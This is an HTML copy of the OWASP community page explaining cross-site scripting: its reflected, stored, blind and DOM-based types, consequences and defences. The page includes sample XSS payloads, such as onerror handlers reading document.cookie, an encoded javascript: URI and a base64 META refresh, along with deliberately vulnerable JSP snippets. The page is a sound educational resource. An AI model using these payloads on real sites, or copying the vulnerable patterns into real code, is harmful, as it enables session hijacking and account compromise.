@@ -1,0 +1,1155 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+
+
+
+
+<meta name="description" content="Cross Site Scripting (XSS) on the main website for The OWASP Foundation. OWASP is a nonprofit foundation that works to improve the security of software.">
+<meta property="og:description" content="Cross Site Scripting (XSS) on the main website for The OWASP Foundation. OWASP is a nonprofit foundation that works to improve the security of software.">
+<meta property="og:title" content="Cross Site Scripting (XSS) | OWASP Foundation">
+<meta property="og:url" content="https://owasp.org/www-community/attacks/xss/">
+<meta property="og:locale" content="en_US">
+
+<!-- should probably look at using article at some point for www-community at least -->
+<meta property="og:type" content="website" />
+<meta property="og:image" content="https://owasp.org/www--site-theme/favicon.ico" />
+<meta http-equiv="X-Content-Type-Options" content="nosniff">
+<meta http-equiv="X-XSS-Protection" content="1; mode=block">
+
+
+<link rel="canonical" href="https://owasp.org/www-community/attacks/xss/" />
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=UA-4531126-1"></script> -->
+<!-- <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-4531126-1');
+</script> -->
+<!-- Google Analytics -->
+
+
+<script src="https://owasp.org/www--site-theme/assets/js/js.cookie.min.js"></script>
+<script>
+  if(Cookies.get('cookies-ok') == 'true' && window.ga === undefined)
+  {
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    ga('create', 'UA-4531126-1', 'auto');
+    ga('send', 'pageview');
+  }
+  else if (Cookies.get('cookies-ok') == 'true')
+  {
+    ga('send', 'pageview');
+  }
+
+  function handleOutboundLinkClicks(event) {
+    var href = '';
+    if(event.target.href == undefined)
+      href = event.target.parentElement.href;
+    else
+      href = event.target.href
+  if(Cookies.get('cookies-ok') == 'true'){  
+    
+    ga('send', 'event', {
+      eventCategory: 'Outbound Link',
+      eventAction: 'click',
+      eventLabel: href,
+      transport: 'beacon'
+    });
+  }
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!-- End Google Analytics -->
+<link rel="stylesheet" href="https://owasp.org/www--site-theme/assets/css/styles.css">
+<link rel="shortcut icon" type="images/x-icon" href="https://owasp.org/www--site-theme/favicon.ico">
+
+<script src="https://owasp.org/www--site-theme/assets/js/jquery-3.7.1.min.js"></script>
+<script src="https://owasp.org/www--site-theme/assets/js/util.js"></script>
+<script src="https://owasp.org/www--site-theme/assets/js/yaml.min.js"></script>
+<script src="https://owasp.org/www--site-theme/assets/js/kjua.min.js"></script>
+<title>Cross Site Scripting (XSS) | OWASP Foundation</title>
+
+    <link rel="stylesheet" href="/www-community/assets/css/mxgraph-responsive.css">
+    <script type="text/javascript">
+      $(function(){
+        var baseurl = "https://github.com/OWASP/www-community/blob/master/";
+        var path = "pages/attacks/Cross-site-Scripting-(XSS).md";
+        $('.repo').html('<a href=' + baseurl + path + '><div class="reset-3c756112--menuItemIcon-206eb252" style="float: left;"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 438.549 438.549" stroke="none" class="icon-7f6730be--text-3f89f380"><g><path d="M409.132 114.573c-19.608-33.596-46.205-60.194-79.798-79.8-33.598-19.607-70.277-29.408-110.063-29.408-39.781 0-76.472 9.804-110.063 29.408-33.596 19.605-60.192 46.204-79.8 79.8C9.803 148.168 0 184.854 0 224.63c0 47.78 13.94 90.745 41.827 128.906 27.884 38.164 63.906 64.572 108.063 79.227 5.14.954 8.945.283 11.419-1.996 2.475-2.282 3.711-5.14 3.711-8.562 0-.571-.049-5.708-.144-15.417a2549.81 2549.81 0 0 1-.144-25.406l-6.567 1.136c-4.187.767-9.469 1.092-15.846 1-6.374-.089-12.991-.757-19.842-1.999-6.854-1.231-13.229-4.086-19.13-8.559-5.898-4.473-10.085-10.328-12.56-17.556l-2.855-6.57c-1.903-4.374-4.899-9.233-8.992-14.559-4.093-5.331-8.232-8.945-12.419-10.848l-1.999-1.431c-1.332-.951-2.568-2.098-3.711-3.429-1.142-1.331-1.997-2.663-2.568-3.997-.572-1.335-.098-2.43 1.427-3.289 1.525-.859 4.281-1.276 8.28-1.276l5.708.853c3.807.763 8.516 3.042 14.133 6.851 5.614 3.806 10.229 8.754 13.846 14.842 4.38 7.806 9.657 13.754 15.846 17.847 6.184 4.093 12.419 6.136 18.699 6.136 6.28 0 11.704-.476 16.274-1.423 4.565-.952 8.848-2.383 12.847-4.285 1.713-12.758 6.377-22.559 13.988-29.41-10.848-1.14-20.601-2.857-29.264-5.14-8.658-2.286-17.605-5.996-26.835-11.14-9.235-5.137-16.896-11.516-22.985-19.126-6.09-7.614-11.088-17.61-14.987-29.979-3.901-12.374-5.852-26.648-5.852-42.826 0-23.035 7.52-42.637 22.557-58.817-7.044-17.318-6.379-36.732 1.997-58.24 5.52-1.715 13.706-.428 24.554 3.853 10.85 4.283 18.794 7.952 23.84 10.994 5.046 3.041 9.089 5.618 12.135 7.708 17.705-4.947 35.976-7.421 54.818-7.421s37.117 2.474 54.823 7.421l10.849-6.849c7.419-4.57 16.18-8.758 26.262-12.565 10.088-3.805 17.802-4.853 23.134-3.138 8.562 21.509 9.325 40.922 2.279 58.24 15.036 16.18 22.559 35.787 22.559 58.817 0 16.178-1.958 30.497-5.853 42.966-3.9 12.471-8.941 22.457-15.125 29.979-6.191 7.521-13.901 13.85-23.131 18.986-9.232 5.14-18.182 8.85-26.84 11.136-8.662 2.286-18.415 4.004-29.263 5.146 9.894 8.562 14.842 22.077 14.842 40.539v60.237c0 3.422 1.19 6.279 3.572 8.562 2.379 2.279 6.136 2.95 11.276 1.995 44.163-14.653 80.185-41.062 108.068-79.226 27.88-38.161 41.825-81.126 41.825-128.906-.01-39.771-9.818-76.454-29.414-110.049z"></path></g></svg><span style="padding-left:8px;">Edit on GitHub</span></div></a>');
+      });
+    </script>
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <script src="/www-community/assets/js/mxgraph-responsive.js" defer></script>
+  </head>
+  <body class="base-grid col-sidebar">
+
+    <div id="blocker"></div>
+
+    <noscript>For full functionality of this site it is necessary to enable JavaScript. Here are the <a href="http://turnonjs.com/"> instructions how to enable JavaScript in your web browser</a>.</noscript>
+    <header role="banner">
+  <div id="banner" class="notice" aria-label="announcement">
+</div>
+
+
+
+
+<style>
+  #banner img {
+    max-width: 30em;
+  }
+
+  @media (max-width: 1131px) {
+    #banner img {
+      max-width: 30em;
+    }
+  }
+
+  @media (max-width: 800px) {
+    #banner img {
+      max-width: 20em;
+    }
+  }
+
+  @media (max-width: 600px) {
+    #banner img {
+      max-width: 20em;
+    }
+  }
+
+  @media (max-width: 450px) {
+    #banner img {
+      max-width: 250px;
+    }
+  }
+</style>
+
+<script type="text/javascript">
+  $(function () {
+    var bannerdata = [];
+    banneryaml = YAML.load('https://owasp.org/www-community/assets/sitedata/banner-data.yml');
+    $.each(banneryaml, function (index) {
+      bannerdata.push(this);
+    });
+
+    if (bannerdata.length > 0) {
+      var htmlstring = "";
+      var usebanner = null;
+      var defbanner = null;
+      var checkdate = new Date(); //local time but who cares about the time?
+      bannerdata.forEach(data => {
+        if (data.start) {
+          var start = data.start;
+
+          if (data.start <= checkdate) {
+            if (data.end) {
+
+              var end = data.end;
+              if (checkdate < end) {
+                usebanner = data;
+              }
+            }
+            else
+              usebanner = data;
+          }
+        }
+        else {
+          defbanner = data;
+        }
+      });
+
+      if (defbanner && !usebanner)
+        usebanner = defbanner;
+      if (usebanner) {
+        htmlstring = usebanner.text;
+        htmlstring += "<a href='#' id='close-banner' aria-label='close announcement' style='float:right;'><i class='fa fa-times'></i></a>";
+
+        $("#banner").html(htmlstring);
+        $("#banner").removeClass("notice");
+        $("#banner").addClass(usebanner.type);
+
+        $("#close-banner").click(function() {
+          $(this).closest("#banner").remove();
+            Cookies.set('banner-seen', 'true', { expires: 7 });
+        });
+      }
+    }
+  });
+</script>
+  <div id="popup" class="notice" aria-label="announcement">
+   
+</div>
+
+
+
+
+<style>
+  #banner img {
+    max-width: 30em;
+  }
+
+  @media (max-width: 1131px) {
+    #banner img {
+      max-width: 30em;
+    }
+  }
+
+  @media (max-width: 800px) {
+    #banner img {
+      max-width: 20em;
+    }
+    #popup {
+      visibility: hidden;
+    }
+  }
+
+  @media (max-width: 600px) {
+    #popup {
+      visibility: hidden;
+    }
+    #banner img {
+      max-width: 20em;
+    }
+  }
+
+  @media (max-width: 450px) {
+    #banner img {
+      max-width: 250px;
+    }
+    #popup {
+      visibility: hidden;
+    }
+  }
+</style>
+
+<script type="text/javascript">
+  $(function () {
+    var popdata = [];
+    $("#popup").hide();
+    popyaml = YAML.load('https://owasp.org/www-community/assets/sitedata/popup-data.yml');
+    $.each(popyaml, function (index) {
+      popdata.push(this);
+    });
+
+    if (popdata.length > 0) {
+      var htmlstring = "";
+      var usepop = null;
+      var defpop = null;
+      var checkdate = new Date(); //local time but who cares about the time?
+      popdata.forEach(data => {
+        if (data.start) {
+          var start = data.start;
+
+          if (data.start <= checkdate) {
+            if (data.end) {
+
+              var end = data.end;
+              if (checkdate < end) {
+                usepop = data;
+              }
+            }
+            else
+              usepop = data;
+          }
+        }
+        else {
+          defpop = data;
+        }
+      });
+
+      if (defpop && !usepop)
+        usepop = defpop;
+      if (usepop) {
+        htmlstring = usepop.text;
+        htmlstring += "<a href='#' id='close-popup' aria-label='close announcement' style='float:right;'><i class='fa fa-times'></i></a>";
+
+        $("#popup").html(htmlstring);
+        $("#popup").removeClass("notice");
+        $("#popup").addClass(usepop.type);
+        
+        if( Cookies.get('popup-seen')!='true')
+        {
+          $("#popup").show();
+        }
+
+        $("#close-popup").click(function() {
+          $(this).closest("#popup").remove();
+            Cookies.set('popup-seen', 'true', { expires: 7 });
+        });
+      }
+    }
+  });
+</script>
+  <div class="header-wrapper" aria-label="main navigation">
+    <nav class="alt-nav">
+      <a href="#" class="menu-toggler" aria-hidden="true">
+        <i class="fa fa-bars"></i>
+      </a>
+      <a href="https://owasp.org/" class="alt-logo" aria-label="go to homepage">
+          <img src="https://owasp.org/assets/images/logo.png" alt="OWASP logo">
+      </a>
+      <div id="overlay" class="remove-el">
+
+      </div>
+      <!-- jekyll menu stuff -->
+    </nav>
+    
+    <nav class="top-nav" role="navigation" aria-label="primary navigation">
+      <a href="https://owasp.org/" class="desktop-logo" aria-label="go to homepage">
+        <img src="https://owasp.org/assets/images/logo.png" alt="">
+      </a>
+      <!-- jekyll menu stuff -->
+      <div id="midmenu" class="top-nav"></div>
+      
+      
+
+      <div class="interactive-wrapper">                
+        <div class="nav-button" aria-label="donate to or join OWASP">
+        
+          <a href="https://owasp.org/store" class="cta-button white inset"><i class="fa fa-shopping-cart" aria-hidden="true"></i> Store</a>
+          <a href="https://owasp.org/donate?reponame=www-community" class="cta-button green">Donate</a>
+          <a href="https://owasp.glueup.com/organization/6727/memberships" class="cta-button">Join</a>
+        </div>
+      </div>
+    </nav>
+    <div id='disclaimer-container'>
+<div id="disclaimer">
+    <p>This website uses cookies to analyze our traffic and only share that information with our analytics partners.</p><a class="disclaimerOK">Accept</a>
+</div>
+<div id="close-disclaimer">x</div>
+</div>
+  </div>
+  <div class="mobile" style="width:100%;display: flex; justify-content: space-evenly;align-items: center;padding: 8px; background-color: #98afc7;">
+    <div><a href="https://owasp.org/store" class="cta-button white inset"><i class="fa fa-shopping-cart" aria-hidden="true"></i>Store</a></div>
+    <div><a href="https://owasp.org/donate?reponame=www-community" class="cta-button green">Donate</a></div>
+    <div><a href="https://owasp.glueup.com/organization/6727/memberships" class="cta-button">Join</a></div>
+  </div>
+
+
+
+<script type="text/javascript">
+  $(function(){
+      
+      url = $(location).attr('href');
+      if(url.includes('www2'))
+      {
+        url = url.replace(/www2./, '');
+        $(location).attr('href',url);
+        return;
+      }
+    // this works to get data from a json file NOT in data
+      $.getJSON("https://owasp.org/www--site-theme/assets/sitedata/menus.json", function(data) {
+         var listr = "<ul aria-label='header menu'>";
+         
+         var mlistr = "<ul class='mobile-menu hide-el' role='navigation' aria-label='mobile primary navigation'>";
+
+          mlistr += "<li><a href='#' class='menu-toggler' aria-hidden='true'><i class='fa fa-times'></i></a></li>";
+          mlistr += "<li>";
+          mlistr += "<form role='search' method='get' action='https://owasp.org/search'>";   
+          mlistr += "<div class='search-div'>";
+          mlistr += "<input id='searchString' aria-label='search input' name='searchString' class='search-bar' type='search' placeholder='Search OWASP.org' required='true'>";
+          mlistr += "<button id='search-button' aria-label='search button' type='submit' class='fa fa-search' style='padding-left: 8px;'></button></div></form>";
+          mlistr += "</li>";
+          $.each(data.menus, function (ndx, menu){
+              listr += "<li><a href='" + menu.url + "'>" + menu.title + "</a>";
+              searchitem = issearch(menu.title);
+              if(!menu.items && !searchitem)
+              {
+                  mlistr += "<li><a href='" + menu.url + "'>" + menu.title + "</a>";
+              }
+              
+              if(menu.items){
+                  listr += "<ul class='dropdown-menu'>";
+                  if(!searchitem) {
+                    mlistr += "<button class='accordion'>" + menu.title + "</button>";
+                    mlistr += "<div class='panel'>";
+                    mlistr += "<ul>";
+                  }
+                $.each(menu.items, function(ndx, item){
+                
+                  if(item.separator)
+                  {
+                      listr += "<li class='separator'>";
+                      if(!searchitem)
+                        mlistr += "<li class='separator'>";
+                  }
+                  else
+                  {
+                      listr += "<li>";
+                      if(!searchitem)
+                        mlistr += "<li>";
+                  }
+                  listr += "<a href='" + item.url + "'";
+                  if(!searchitem)
+                    mlistr += "<a href='" + item.url + "'";
+                  if(item.opentab)
+                  {
+                    listr += " target='_blank' rel='noopener noreferrer'";
+                    if(!searchitem)
+                      mlistr += " target='_blank' rel='noopener noreferrer'";
+                  }
+
+                  listr += ">" + item.title + "</a></li>";
+                  if(!searchitem)
+                    mlistr += ">" + item.title + "</a></li>";
+                });
+                listr += "</ul>";
+                if(!searchitem){
+                  mlistr += "</ul>";
+                  mlistr += "</div>";
+                }
+              }
+              
+              listr += "</li>";
+              if(!searchitem)
+                mlistr += "</li>";
+          });
+          listr += "</ul>";
+          mlistr += "<li><a href='https://owasp.org/donate'>MAKE A DONATION</a></li>";
+          mlistr += "<li><a href='https://owasp.org/membership'>BECOME A MEMBER</a></li>";
+          mlistr += "<li><a href='https://owasp.org/sitemap'>SITEMAP</a></li>";
+          mlistr += "</ul>";
+          
+          //$('.desktop-logo').after(listr);
+          $('#midmenu').html(listr);
+          $('#overlay').after(mlistr);
+
+          $(".accordion").click(function () {
+              $(this).toggleClass("active");
+              if($(this).next('.panel').css('display') == 'block'){
+                $(this).next('.panel').css('display', 'none');
+              }
+              else {
+                $(this).next('.panel').css('display', 'block');
+              }
+            });
+            $(".menu-toggler").click(function() {
+              $(".mobile-menu").toggleClass('hide-el');
+            });
+      });
+    });
+
+    function issearch(title) {
+      return title.indexOf('fa fa-search') > -1;
+    }
+  </script>
+</header>
+
+
+
+    <main role="main">
+      <div class="main-wrapper">
+        
+  
+  
+  
+  
+  
+  
+  
+
+
+
+
+
+        <h1 class="page-title">Cross Site Scripting (XSS)</h1>
+        <div id="main" class="page-body tab" role="tabpanel" aria-labelledby="main-link" tabindex="0">
+          
+          <section id='sec-main' class='page-body'>
+          <div style="font-size: 75%">
+
+  <b>Author:</b> KirstenS <br />
+
+
+  <b>Contributor(s):</b> Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon, kingthorin, Vikas Khanna. Grant Ongers <br />
+
+</div>
+
+<h2 id="overview">Overview</h2>
+
+<p>Cross-Site Scripting (XSS) attacks are a type of injection, in which
+malicious scripts are injected into otherwise benign and trusted
+websites. XSS attacks occur when an attacker uses a web application to
+send malicious code, generally in the form of a browser side script, to
+a different end user. Flaws that allow these attacks to succeed are
+quite widespread and occur anywhere a web application uses input from a
+user within the output it generates without validating or encoding it.</p>
+
+<p>An attacker can use XSS to send a malicious script to an unsuspecting
+user. The end user’s browser has no way to know that the script should
+not be trusted, and will execute the script. Because it thinks the
+script came from a trusted source, the malicious script can access any
+cookies, session tokens, or other sensitive information retained by the
+browser and used with that site. These scripts can even rewrite the
+content of the HTML page. For more details on the different types of XSS
+flaws, see: <a href="../../Types_of_Cross-Site_Scripting">Types of Cross-Site Scripting</a>.</p>
+
+<h2 id="related-security-activities">Related Security Activities</h2>
+
+<h3 id="how-to-avoid-cross-site-scripting-vulnerabilities">How to Avoid Cross-site scripting Vulnerabilities</h3>
+
+<ul>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">XSS (Cross Site Scripting) Prevention Cheat Sheet</a></li>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">DOM based XSS Prevention Cheat Sheet</a></li>
+  <li>OWASP Development Guide <a href="https://wiki.owasp.org/index.php/Data_Validation">article on Data Validation</a></li>
+  <li>OWASP Development Guide <a href="https://wiki.owasp.org/index.php/Phishing">article on Phishing</a></li>
+</ul>
+
+<h3 id="how-to-review-code-for-cross-site-scripting-vulnerabilities">How to Review Code for Cross-site scripting Vulnerabilities</h3>
+
+<p>See the <a href="https://owasp.org/www-project-code-review-guide/">OWASP Code Review Guide</a>.</p>
+
+<h3 id="how-to-test-for-cross-site-scripting-vulnerabilities">How to Test for Cross-site scripting Vulnerabilities</h3>
+
+<p>See the latest <a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Testing Guide</a> article on how to
+test for the various kinds of XSS vulnerabilities.</p>
+
+<ul>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html">Testing_for_Reflected_Cross_site_scripting</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html">Testing_for_Stored_Cross_site_scripting</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html">Testing_for_DOM-based_Cross_site_scripting</a></li>
+</ul>
+
+<h2 id="description">Description</h2>
+
+<p>Cross-Site Scripting (XSS) attacks occur when:</p>
+
+<ol>
+  <li>Data enters a Web application through an untrusted source, most frequently a web request.</li>
+  <li>The data is included in dynamic content that is sent to a web user without being validated for malicious content.</li>
+</ol>
+
+<p>The malicious content sent to the web browser often takes the form of a
+segment of JavaScript, but may also include HTML, Flash, or any other
+type of code that the browser may execute. The variety of attacks based
+on XSS is almost limitless, but they commonly include transmitting
+private data, like cookies or other session information, to the
+attacker, redirecting the victim to web content controlled by the
+attacker, or performing other malicious operations on the user’s machine
+under the guise of the vulnerable site.</p>
+
+<h3 id="reflected-and-stored-xss-attacks">Reflected and Stored XSS Attacks</h3>
+
+<p>XSS attacks can generally be categorized into two categories: reflected 
+and stored. There is a third, much less well-known type of XSS attack
+called <a href="../DOM_Based_XSS">DOM Based XSS</a> that is discussed
+separately <a href="../DOM_Based_XSS">here</a>.</p>
+
+<h4 id="reflected-xss-attacks">Reflected XSS Attacks</h4>
+
+<p>Reflected attacks are those where the injected script is reflected off
+the web server, such as in an error message, search result, or any other
+response that includes some or all of the input sent to the server as
+part of the request. Reflected attacks are delivered to victims via
+another route, such as in an e-mail message, or on some other website.
+When a user is tricked into clicking on a malicious link, submitting a
+specially crafted form, or even just browsing to a malicious site, the
+injected code travels to the vulnerable web site, which reflects the
+attack back to the user’s browser. The browser then executes the code
+because it came from a “trusted” server. Reflected XSS is also sometimes
+referred to as Non-Persistent or Type-I XSS (the attack is carried out 
+through a single request / response cycle).</p>
+
+<h4 id="stored-xss-attacks">Stored XSS Attacks</h4>
+
+<p>Stored attacks are those where the injected script is permanently stored
+on the target servers, such as in a database, in a message forum,
+visitor log, comment field, etc. The victim then retrieves the malicious
+script from the server when it requests the stored information. Stored
+XSS is also sometimes referred to as Persistent or Type-II XSS.</p>
+
+<h4 id="blind-cross-site-scripting">Blind Cross-site Scripting</h4>
+
+<p>Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker’s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed. 
+Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.</p>
+
+<h3 id="other-types-of-xss-vulnerabilities">Other Types of XSS Vulnerabilities</h3>
+
+<p>In addition to Stored and Reflected XSS, another type of XSS, <a href="../DOM_Based_XSS">DOM Based
+XSS</a> was identified by <a href="http://www.webappsec.org/projects/articles/071105.shtml">Amit Klein
+in 2005</a>. OWASP
+recommends the XSS categorization as described in the OWASP Article:
+<a href="../../Types_of_Cross-Site_Scripting">Types of Cross-Site Scripting</a>, which covers all
+these XSS terms, organizing them into a matrix of Stored vs. Reflected
+XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
+XSS.</p>
+
+<h4 id="xss-attack-consequences">XSS Attack Consequences</h4>
+
+<p>The consequence of an XSS attack is the same regardless of whether it is
+stored or reflected (<a href="../DOM_Based_XSS">or DOM Based</a>). The
+difference is in how the payload arrives at the server. Do not be fooled
+into thinking that a “read-only” or “brochureware” site is not
+vulnerable to serious reflected XSS attacks. XSS can cause a variety of
+problems for the end user that range in severity from an annoyance to
+complete account compromise. The most severe XSS attacks involve
+disclosure of the user’s session cookie, allowing an attacker to hijack
+the user’s session and take over the account. Other damaging attacks
+include the disclosure of end user files, installation of Trojan horse
+programs, redirecting the user to some other page or site, or modifying
+presentation of content. An XSS vulnerability allowing an attacker to
+modify a press release or news item could affect a company’s stock price
+or lessen consumer confidence. An XSS vulnerability on a pharmaceutical
+site could allow an attacker to modify dosage information resulting in
+an overdose. For more information on these types of attacks see
+<a href="../Content_Spoofing">Content_Spoofing</a>.</p>
+
+<h3 id="how-to-determine-if-you-are-vulnerable">How to Determine If You Are Vulnerable</h3>
+
+<p>XSS flaws can be difficult to identify and remove from a web
+application. The best way to find flaws is to perform a security review
+of the code and search for all places where input from an HTTP request
+could possibly make its way into the HTML output. Note that a variety of
+different HTML tags can be used to transmit a malicious JavaScript.
+Nessus, Nikto, and some other available tools can help scan a website
+for these flaws, but can only scratch the surface. If one part of a
+website is vulnerable, there is a high likelihood that there are other
+problems as well.</p>
+
+<h3 id="how-to-protect-yourself">How to Protect Yourself</h3>
+
+<p>The primary defenses against XSS are described in the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat
+Sheet</a>.</p>
+
+<p>Also, it’s crucial that you turn off HTTP TRACE support on all web
+servers. An attacker can steal cookie data via Javascript even when
+document.cookie is disabled or not supported by the client. This attack
+is mounted when a user posts a malicious script to a forum so when
+another user clicks the link, an asynchronous HTTP Trace call is
+triggered which collects the user’s cookie information from the server,
+and then sends it over to another malicious server that collects the
+cookie information so the attacker can mount a session hijack attack.
+This is easily mitigated by removing support for HTTP TRACE on all web
+servers.</p>
+
+<p>The <a href="https://www.owasp.org/www-project-enterprise-security-api">OWASP ESAPI project</a> has produced a set of
+reusable security components in several languages, including validation
+and escaping routines to prevent parameter tampering and the injection
+of XSS attacks. In addition, the <a href="https://www.owasp.org/www-project-webgoat/">OWASP WebGoat Project</a> training
+application has lessons on Cross-Site Scripting and data encoding.</p>
+
+<h3 id="alternate-xss-syntax">Alternate XSS Syntax</h3>
+
+<h4 id="xss-using-script-in-attributes">XSS Using Script in Attributes</h4>
+
+<p>XSS attacks may be conducted without using <code class="language-plaintext highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code>
+tags. Other tags will do exactly the same thing, for example:
+<code class="language-plaintext highlighter-rouge">&lt;body onload=alert('test1')&gt;</code> or other attributes like: <code class="language-plaintext highlighter-rouge">onmouseover</code>, <code class="language-plaintext highlighter-rouge">onerror</code>.</p>
+
+<h5 id="onmouseover">onmouseover</h5>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;b onmouseover=alert('Wufff!')&gt;click me!&lt;/b&gt;</code></p>
+
+<h5 id="onerror">onerror</h5>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);&gt;</code></p>
+
+<h4 id="xss-using-script-via-encoded-uri-schemes">XSS Using Script Via Encoded URI Schemes</h4>
+
+<p>If we need to hide against web application filters we may try to encode
+string characters, e.g.: <code class="language-plaintext highlighter-rouge">a=&amp;\#X41</code> (UTF-8) and use it in <code class="language-plaintext highlighter-rouge">IMG</code> tags:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;IMG SRC=j&amp;#X41vascript:alert('test2')&gt;</code></p>
+
+<p>There are many different UTF-8 encoding notations that give us even more
+possibilities.</p>
+
+<h4 id="xss-using-code-encoding">XSS Using Code Encoding</h4>
+
+<p>We may encode our script in base64 and place it in <code class="language-plaintext highlighter-rouge">META</code> tag. This way we
+get rid of <code class="language-plaintext highlighter-rouge">alert()</code> totally. More information about this method can be
+found in RFC 2397</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;META</span> <span class="na">HTTP-EQUIV=</span><span class="s">"refresh"</span>
+<span class="na">CONTENT=</span><span class="s">"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>These and others examples can be found at the OWASP <a href="../../xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a> which is a true
+encyclopedia of the alternate XSS syntax attack.</p>
+
+<h2 id="examples">Examples</h2>
+
+<p>Cross-site scripting attacks may occur anywhere that possibly malicious
+users are allowed to post unregulated material to a trusted website for
+the consumption of other valid users.</p>
+
+<p>The most common example can be found in bulletin-board websites which
+provide web based mailing list-style functionality.</p>
+
+<h3 id="example-1">Example 1</h3>
+
+<p>The following JSP code segment reads an employee ID, eid, from an HTTP
+request and displays it to the user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;% String eid = request.getParameter("eid"); %&gt;
+...
+Employee ID: &lt;%= eid %&gt;
+</code></pre></div></div>
+
+<p>The code in this example operates correctly if <code class="language-plaintext highlighter-rouge">eid</code> contains only
+standard alphanumeric text. If <code class="language-plaintext highlighter-rouge">eid</code> has a value that includes
+meta-characters or source code, then the code will be executed by the
+web browser as it displays the HTTP response.</p>
+
+<p>Initially, this might not appear to be much of a vulnerability. After
+all, why would someone enter a URL that causes malicious code to run on
+their own computer? The real danger is that an attacker will create the
+malicious URL, then use e-mail or social engineering tricks to lure
+victims into visiting a link to the URL. When victims click the link,
+they unwittingly reflect the malicious content through the vulnerable
+web application back to their own computers. This mechanism of
+exploiting vulnerable web applications is known as Reflected XSS.</p>
+
+<h3 id="example-2">Example 2</h3>
+
+<p>The following JSP code segment queries a database for an employee with a
+given ID and prints the corresponding employee’s name.</p>
+
+<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span><span class="o">...</span>
+ <span class="nc">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
+ <span class="nc">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="s">"select * from emp where id="</span><span class="o">+</span><span class="n">eid</span><span class="o">);</span>
+ <span class="k">if</span> <span class="o">(</span><span class="n">rs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+  <span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+  <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"name"</span><span class="o">);</span>
+<span class="nt">%&gt;</span>
+
+Employee Name: <span class="nt">&lt;%=</span> <span class="n">name</span> <span class="nt">%&gt;</span>
+</code></pre></div></div>
+
+<p>As in Example 1, this code functions correctly when the values of name
+are well-behaved, but it does nothing to prevent exploits if they are
+not. Again, this code can appear less dangerous because the value of
+name is read from a database, whose contents are apparently managed by
+the application. However, if the value of name originates from
+user-supplied data, then the database can be a conduit for malicious
+content. Without proper input validation on all data stored in the
+database, an attacker can execute malicious commands in the user’s web
+browser. This type of exploit, known as Stored XSS, is particularly
+insidious because the indirection caused by the data store makes it more
+difficult to identify the threat and increases the possibility that the
+attack will affect multiple users. XSS got its start in this form with
+websites that offered a “guestbook” to visitors. Attackers would include
+JavaScript in their guestbook entries, and all subsequent visitors to
+the guestbook page would execute the malicious code.</p>
+
+<p>As the examples demonstrate, XSS vulnerabilities are caused by code that
+includes unvalidated data in an HTTP response. There are three vectors
+by which an XSS attack can reach a victim:</p>
+
+<ul>
+  <li>As in Example 1, data is read directly from the HTTP request and
+  reflected back in the HTTP response. Reflected XSS exploits occur
+  when an attacker causes a user to supply dangerous content to a
+  vulnerable web application, which is then reflected back to the user
+  and executed by the web browser. The most common mechanism for
+  delivering malicious content is to include it as a parameter in a
+  URL that is posted publicly or e-mailed directly to victims. URLs
+  constructed in this manner constitute the core of many phishing
+  schemes, whereby an attacker convinces victims to visit a URL that
+  refers to a vulnerable site. After the site reflects the attacker’s
